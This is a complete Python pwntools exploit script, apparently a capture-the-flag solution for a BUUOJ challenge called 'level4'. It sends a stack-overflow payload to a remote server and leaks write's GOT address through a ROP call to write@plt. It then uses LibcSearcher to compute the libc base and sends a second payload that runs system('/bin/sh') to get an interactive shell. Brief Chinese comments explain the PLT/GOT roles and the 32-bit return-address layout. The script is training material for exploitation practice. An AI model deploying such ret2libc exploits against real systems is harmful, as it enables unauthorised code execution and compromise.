#coding:utf-8
from LibcSearcher import *
from pwn import *
#p=process('./level4')
p=remote('node3.buuoj.cn',27648)
elf=ELF('./level4')
write_plt=elf.plt["write"]
write_got = elf.got["write"]  #调用时使用plt，泄露时泄露got

p.send("a"*0x88+"aaaa"+p32(write_plt)+p32(0x804844B)+p32(1)+p32(write_got)+p32(4)) #
write_addr=u32(p.recv(4))
print "write_addr:"+hex(write_addr)
libc=LibcSearcher("write",int(write_addr))
base=write_addr-libc.dump("write")
print "base: "+hex(base)
system_addr=base+libc.dump("system")
str_addr=base+libc.dump("str_bin_sh")
p.send('a'*(0x88+4)+p32(system_addr)+p32(1234) + p32(str_addr))
p.interactive()

# 特别注意x32的栈溢出调用函数地址之后更上想要返回的原程序函数地址
